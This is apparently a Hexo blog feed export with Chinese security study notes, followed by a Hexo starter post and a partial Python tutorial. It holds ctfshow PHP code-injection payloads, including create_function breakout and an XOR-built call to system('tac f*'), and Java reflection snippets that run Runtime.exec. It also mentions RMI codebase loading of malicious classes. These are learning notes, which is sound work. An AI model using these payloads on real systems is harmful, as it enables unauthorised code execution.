<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后执行，如果我们想要执行任意代码，就首先需要跳出这个函数定义。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111;&#125;phpinfo();//&#x27;</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样一来，我们想要执行的代码就会执行</p>
<h1 id="Web148"><a href="#Web148" class="headerlink" title="Web148"></a>Web148</h1><p>这题就有点没看懂的感觉</p>
<p>说是使用中文变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=$哈=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*</span><br><span class="line">&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; 异或出来的结果是 _GET</span><br><span class="line">$&#123;_GET&#125;[哼]($&#123;_GET&#125;[嗯]);&amp;哼=call_user_func&amp;嗯=get_ctfshow_fl0g</span><br></pre></td></tr></table></figure>

<p>***”&#96;</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>java反序列化以及一些前置知识</title>
    <url>/2023/11/09/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9A%84%E4%B8%80%E4%BA%9B%E8%87%AA%E6%88%91%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<p>最近学习了java反序列化以及反射 的相关知识，就在这稍微做一些总结。</p>
<span id="more"></span>

<h1 id="一、Java反射"><a href="#一、Java反射" class="headerlink" title="一、Java反射"></a>一、Java反射</h1><p>java反射其实也就是比较基础简单的，主要就是集中在一些函数上。</p>
<p>首先就是反射的作用是什么</p>
<blockquote>
<p>1、让java具有动态性</p>
<p>2、修改已有对象的属性的值</p>
<p>3、动态生成对象</p>
<p>4、动态调用方法</p>
<p>5、操作内部类和私有方法私有变量</p>
</blockquote>
<p>其次就是最主要的一点</p>
<p>Java反射在Java反序列化中的应用</p>
<blockquote>
<p><strong>1、定制需要的对象</strong></p>
<p><strong>2、通过invoke去调用同名函数以外的函数</strong></p>
<p><strong>3、通过Class类创建对象，引入不能序列化的类然后通过反射去执行</strong></p>
</blockquote>
<p>首先就是介绍总结一下java反射中用到的一些相关方法，当然也不是直接对着方法名记忆，那样太枯燥了，主要就是在使用的过程中去学习。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//这个的意思就是获取到java.lang.Runtime这个类，是一种获取类最常见的方法，然后获取到的类就被“等同”于clazz（！！！这里要想起来类和对象之间的区别，这两个不是同一种东西！！！）</span></span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br><span class="line"><span class="comment">//这里我们就逐步分析，首先就是getMethod就是获取一个类的方法</span></span><br><span class="line"><span class="comment">//格式： 类.getMethod（“方法名”, 这个方法需要传递的参数类型）</span></span><br><span class="line"><span class="comment">//然后就是invoke，这是一个调用上面获得的方法。</span></span><br><span class="line"><span class="comment">//格式： 方法名.(类的一个对象,需要传递给方法的参数)</span></span><br><span class="line"><span class="comment">//newInstance就是调用该类的构造方法去实例化一个对象</span></span><br></pre></td></tr></table></figure>

<p>当然这样直接去运行时会产生报错的！！！这又是为什么呢？</p>
<p>这里主要就是因为我们无法通过newInstance去获得类的对象，而这里是因为Runtime的构造方法是私有的，是一种”单例”的设计模式</p>
<blockquote>
<p>单例的设计模式：主要是考虑到某些类一般只需要类的初始化时使用一次构造方法，而不是每次都需要去再重新使用构造方法，但这样的话我们又应该怎么样去调用构造方法呢？所以设计者就设计了一个静态方法，像这里的就是getRuntime这个方法，使用这个方法就会返回一个对象</p>
</blockquote>
<p>所以修改之后的代码就是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethed.invoke(clazz);</span><br><span class="line">execMethod.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这样就可以去调用到我们需要的方法了。</p>
<p>当然这样也是还有点缺点的，就比如如果没有这个getRuntime的方法呢？这又应该怎么办？</p>
<p>这个时候就可以使用getConstructor这个方法去获取到我们想要的类。</p>
<blockquote>
<p>格式： 类.getConstructor(构造方法的参数类型)</p>
</blockquote>
<p>eg.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>

<p>然后就是如果构造方法是私有方法，我们应该去使用getDeclaredMethod这个方法。</p>
<blockquote>
<p>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 </p>
<p>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了</p>
<p>还有就是getConstructor和getDeclaredConstructor基本上相似的，这里就不过多解释了</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>setAccessible必须要设置为true，不然无法去使用。</p>
<h1 id="二、JDK动态代理"><a href="#二、JDK动态代理" class="headerlink" title="二、JDK动态代理"></a>二、JDK动态代理</h1><p>首先就是个人感觉java的动态代理技术就有点与Python中的装饰器</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-11/4b18054f0f5d8eb98cb45ce94a070ab0--4962--image-20240311143731878.png" alt="image-20240311143731878"></p>
<p>通过调用jdk自带的相关方法，从而去省略跳过自身创建静态代理</p>
<p>ProxyTest.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">UserInvocationHandler</span> <span class="variable">userinvocationhandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>();</span><br><span class="line"><span class="type">IUser</span> <span class="variable">userProxy</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),userinvocationhandler)</span><br><span class="line">userProxy.method;   <span class="comment">//这样就可以去代理user的方法</span></span><br></pre></td></tr></table></figure>

<p>UserInvocationHandler.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">IUser user;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">(IUser user)</span>&#123;<span class="built_in">this</span>.user = user;&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">    method.invoke(user,args);   <span class="comment">//进行反射去调用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>这样也就成功实现了简单的动态代理了</p>
<h1 id="三、类的动态加载"><a href="#三、类的动态加载" class="headerlink" title="三、类的动态加载"></a>三、类的动态加载</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br></pre></td></tr></table></figure>

<p>获得系统当前的类加载器</p>
<p> 构造代码块，静态代码块———————无论调用什么构造方法都会先调用构造代码块。同理，静态代码块也是如此</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//构造代码块</span><br><span class="line">&#123;</span><br><span class="line">	xxxxxx</span><br><span class="line">&#125;</span><br><span class="line">静态代码块</span><br><span class="line">static&#123;</span><br><span class="line">	xxxxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就去实现一个具体的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Test.class&quot;</span>));</span><br><span class="line"><span class="comment">//        Class c =  (Class) defineClassMethod.invoke(cl, &quot;Test&quot;, code,0,code.length);</span></span><br><span class="line"><span class="comment">//        c.newInstance();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Unsafe.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br><span class="line">        Class&lt;?&gt; test = unsafe.defineClass(<span class="string">&quot;Test&quot;</span>, code, <span class="number">0</span>, code.length, cl, <span class="literal">null</span>);</span><br><span class="line">        test.newInstance();</span><br></pre></td></tr></table></figure>

<p>通过类加载器可以去实现加载远程或者本地的其他目录下的类</p>
<h1 id="四、RMI"><a href="#四、RMI" class="headerlink" title="四、RMI"></a>四、RMI</h1><p>RMI全称是Remote Method Invocation，远程⽅法调⽤。听这名字应该也就知道，就是去从调用一个远程主机上的java方法，在这里就挑一些重点的代码片段进行讲解。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());(这里是服务器上启动的)</span><br></pre></td></tr></table></figure>

<p>首先第一行这里就是创建并且执行Registry服务，这个服务就是相当于一个中继器，我将类和一个名字绑定丢到这里面去，别的人就可以通过名字去拿到这个对应的类，这就是Registry所起到的一个作用。然后就是第二行，就是将本机的一个类给绑定到了一个Registry服务上，这样等之后就可以去直接拿到这个类了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RMIServer.<span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIServer.IRemoteHelloWorld)Naming.lookup(<span class="string">&quot;rmi://vps_ip:1099/Hello&quot;</span>);(本机运行)</span><br></pre></td></tr></table></figure>

<p>这里就通过Naming的lookup方法去寻找这个rmi类，我们就可以在Registry中拿到我们想要的类。</p>
<p>codebase的利用方法</p>
<p>在以前的有段时间，java是可以运行在浏览器上的，就有一个codebase属性，这是一个地址，去告诉哪个地方寻找类，这个时候我们就可以使用rmi的相关操作，去使其加载我们自己部署的服务器上的一些恶意类。</p>
<p>就比如在log4j这个CVE中，也是可以去使用rmi去实现的，去完成反弹shell从而获得权限。</p>
<h2 id="🌟补充："><a href="#🌟补充：" class="headerlink" title="🌟补充："></a>🌟补充：</h2><h2 id="🌟关于rmi服务的具体流程调试"><a href="#🌟关于rmi服务的具体流程调试" class="headerlink" title="🌟关于rmi服务的具体流程调试"></a>🌟关于rmi服务的具体流程调试</h2><p>参考文章和视频（我认为讲的特别好，强烈推荐！）</p>
<p><a href="https://halfblue.github.io/2021/10/26/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">https://halfblue.github.io/2021/10/26/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/</a></p>
<p><a href="https://www.bilibili.com/video/BV1L3411a7ax/?p=3&spm_id_from=pageDriver&vd_source=2e4979b0a36df1ed7510f03f3d33843f">https://www.bilibili.com/video/BV1L3411a7ax/?p=3&amp;spm_id_from=pageDriver&amp;vd_source=2e4979b0a36df1ed7510f03f3d33843f</a></p>
<h3 id="1、远程对象的创建过程"><a href="#1、远程对象的创建过程" class="headerlink" title="1、远程对象的创建过程"></a>1、远程对象的创建过程</h3><p>主要的作用点就在远程方法所继承的UnicastRemoteObject类中，是用于将本地方法发布的</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/449e96cbf56cb91ce5fea4b44d8b8a9d--7f10--image-20240309103527834.png" alt="image-20240309103527834"></p>
<p>然后就是由于端口是未知的，端口为零，然后调用exportObject方法区将方法给发布，exportObject就是发布的重要函数，继续跟进，就会发现是在一层层去调用不同类中的exportObject函数</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/06d268d7507144247ead0bb8c9255342--2361--image-20240309103730436.png" alt="image-20240309103730436"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/7ad2af7b7010c5f18072cee984418b57--edf1--image-20240309103742756.png" alt="image-20240309103742756"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/5f99a7d5c8eec788788dad375fdea453--4636--image-20240309103823798.png" alt="image-20240309103823798"></p>
<p>最后在这里，会发现一个createProxy，看名字就能看出来，是一个创建代理的方法，我们跟进看看</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/fba392778289afa99fadb0b2d1d04f80--716c--image-20240309104011784.png"></p>
<p>发现是一个判断是否有_stub后缀的方法，如果没有，就创建一个，后边就是一些不太好理解的东西了</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/09d963caced12b347a0198ea8d71cedd--9e31--image-20240309104201242.png" alt="image-20240309104201242"></p>
<p>然后就跳到了这里，我们跟进函数，发现也是一个判断_Skel后缀的方法，在继续调试，发现创建了一个Target，一个很关键的东西</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/307c578130cd22ddfc56de56ca7d50ca--06fe--image-20240309104525491.png" alt="image-20240309104525491"></p>
<p>里面把所有相关的stud，ID等都记录进去了，然后就又是一系列的exportObject去将Target给发布出去了。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/c95a79909fbc8ca393b09350ffebb05f--a583--image-20240309104817139.png" alt="image-20240309104817139"></p>
<p>最后发现服务端还会建一张表，去将Target给存入其中，从而保留让服务端知道有关这个远程方法的所有信息。</p>
<p>这差不多 就是远程方法的创建的过程了</p>
<h3 id="2、注册中心的创建"><a href="#2、注册中心的创建" class="headerlink" title="2、注册中心的创建"></a>2、注册中心的创建</h3><p>相比来说注册中心的创建就简单很多了，我们直接调试跟进</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/73441644e29781969609c21fda9ca8fe--2d0d--image-20240309105935201.png" alt="image-20240309105935201"></p>
<p>在这里就发现了重点—–LiveRef</p>
<blockquote>
<p>在上面之前忘记将了，LiveRef又是什么，这是一个在rmi远程方法调用中非常重要的一个，他其中封装了服务端中所有相关的信息，比如远程方法的ID，地址和端口，以及各种信息</p>
</blockquote>
<p>然后就发现是调用TCPEndpoint，去获取本地的Endpoint服务，从而以此去完成相关TCP服务的操作。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/d772f29e62f647771bd36cdf2c484757--4802--image-20240309110603314.png" alt="image-20240309110603314"></p>
<p>发现就又是exportObject方法，发现后边就是和之前的远程方法调用基本就是一致的了，就能够知道注册中心的创建，其实也是一个远程方法的发布过程实际上。</p>
<h3 id="3、远程方法绑定"><a href="#3、远程方法绑定" class="headerlink" title="3、远程方法绑定"></a>3、远程方法绑定</h3><p>这里就比较简单了，因为这里并不是远程绑定，就直接调用了RegistryImpl类，把名字和远程对象放到一个叫bindings的HashTable里面。<br>到这里服务端的流程就走完了。</p>
<h1 id="三、serialize🌟"><a href="#三、serialize🌟" class="headerlink" title="三、serialize🌟"></a>三、serialize🌟</h1><p>这是学习的重难点，我现在也还知识初步了解一些，还没完全弄完😭</p>
<p>一般web手初识反序列化都是从php开始，首先就java的反序列化和php的还是有很大区别的，php是直接利用serialize和unserialize这两个函数进行序列化和反序列化的过程，我们无法去控制这个过程中的任何东西，而java就不一样了。</p>
<blockquote>
<ul>
<li>writeObject：序列化</li>
<li>readObject：反序列化</li>
</ul>
</blockquote>
<p>这两个主要是java中序列化反序列化所需要使用到的，一般需要搭配一些其他的东西去使用。</p>
<p>eg</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;result.txt&quot;</span>);  <span class="comment">//用于保存序列化数据</span></span><br><span class="line">     ObjectOutputStream obj_out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);   <span class="comment">//实例化一个对象输出流</span></span><br><span class="line">     <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">     u.setName(<span class="string">&quot;6pc1&quot;</span>);</span><br><span class="line">     obj_out.writeObject(u);   <span class="comment">//利用writeObject方法将序列化对象存储在本地</span></span><br><span class="line">     obj_out.close();</span><br><span class="line">     System.out.println(<span class="string">&quot;User对象序列化成功！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;result.txt&quot;</span>);  <span class="comment">//读取之前保存的序列化数据</span></span><br><span class="line">     <span class="type">ObjectInputStream</span> <span class="variable">ins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);  <span class="comment">//实例化一个对象输入流</span></span><br><span class="line">     <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> (User)ins.readObject();      <span class="comment">//利用readObject方法将序列化对象转为对象</span></span><br><span class="line">     system.out.println(<span class="string">&quot;User对象反序列化成功！&quot;</span>);</span><br><span class="line">     System.out.println(u.getName());</span><br><span class="line">     ins.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就是java反序列话的主要过程，是可以自己去操作序列化反序列化的一些过程的，就比如在序列化后的文件中添加一些数据一类的</p>
<p>这也不是唯一一种，我们也可以用byte流的方法代替文件流</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">ObjectOutputStream obj_out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br></pre></td></tr></table></figure>

<h1 id="四、CC1链"><a href="#四、CC1链" class="headerlink" title="四、CC1链"></a>四、CC1链</h1>]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>serialize</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/11/06/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>python学习历程(1)</title>
    <url>/2023/11/11/python%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B-1/</url>
    <content><![CDATA[<p>最近也是大二了，好不容易终于接到了大创了，不过大创需要我们去深入学习python，加上打算去参加一个python的项目制作，再去想想我那python水平，简直一言难尽，只能抓紧时间赶快补了😱</p>
<p>这里就简单记录一下一些我没有什么印象的或者感觉比较重要的知识点。</p>
<span id="more"></span>

<h1 id="一、python参数中的一些特殊参数"><a href="#一、python参数中的一些特殊参数" class="headerlink" title="一、python参数中的一些特殊参数"></a>一、python参数中的一些特殊参数</h1><p>首先就需要先去了解一下什么是位置参数和关键字参数分别是什么。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line">    <span class="built_in">print</span>(arg)</span><br><span class="line">    </span><br><span class="line">standard_arg(<span class="number">123</span>)   //位置参数，多个参数需要注意排序位置</span><br><span class="line">standard_arg(arg=<span class="number">21</span>)   //关键字参数</span><br></pre></td></tr></table></figure>

<p>函数定义中未使用 <code>/</code> 和 <code>*</code> 时，参数可以按位置或关键字传递给函数。</p>
<h2 id="1、仅位置参数"><a href="#1、仅位置参数" class="headerlink" title="1、仅位置参数"></a>1、仅位置参数</h2><p>仅限位置时，形参的顺序很重要，并且这些参数在传参时必须使用位置参数传参</p>
<p>仅限位置形参应放在 <code>/</code> （正斜杠）前。<code>/</code> 用于在逻辑上分割仅限位置形参与其它形参。如果函数定义中没有 <code>/</code>，则表示没有仅限位置形参</p>
<h2 id="2、仅关键词参数"><a href="#2、仅关键词参数" class="headerlink" title="2、仅关键词参数"></a>2、仅关键词参数</h2><p>把形参标记为 <em>仅限关键字</em>，表明必须以关键字参数形式传递该形参，应在参数列表中第一个 <em>仅限关键字</em> 形参前添加 <code>*</code>。</p>
<h2 id="3、实例"><a href="#3、实例" class="headerlink" title="3、实例"></a>3、实例</h2><p>请看下面的函数定义示例，注意 <code>/</code> 和 <code>*</code> 标记：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">pos_only_arg</span>(<span class="params">arg, /</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">kwd_only_arg</span>(<span class="params">*, arg</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">combined_example</span>(<span class="params">pos_only, /, standard, *, kwd_only</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(pos_only, standard, kwd_only)</span><br></pre></td></tr></table></figure>

<p>第一个函数定义 <code>standard_arg</code> 是最常见的形式，对调用方式没有任何限制，可以按位置也可以按关键字传递参数：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>standard_arg(<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>standard_arg(arg=<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>第二个函数 <code>pos_only_arg</code> 的函数定义中有 <code>/</code>，仅限使用位置形参：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos_only_arg(<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos_only_arg(arg=<span class="number">1</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: pos_only_arg() got some positional-only arguments passed <span class="keyword">as</span> keyword arguments: <span class="string">&#x27;arg&#x27;</span></span><br></pre></td></tr></table></figure>

<p>第三个函数 <code>kwd_only_args</code> 的函数定义通过 <code>*</code> 表明仅限关键字参数：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>kwd_only_arg(<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: kwd_only_arg() takes <span class="number">0</span> positional arguments but <span class="number">1</span> was given</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>kwd_only_arg(arg=<span class="number">3</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>最后一个函数在同一个函数定义中，使用了全部三种调用惯例：</p>
<p>&gt;&gt;&gt;</p>
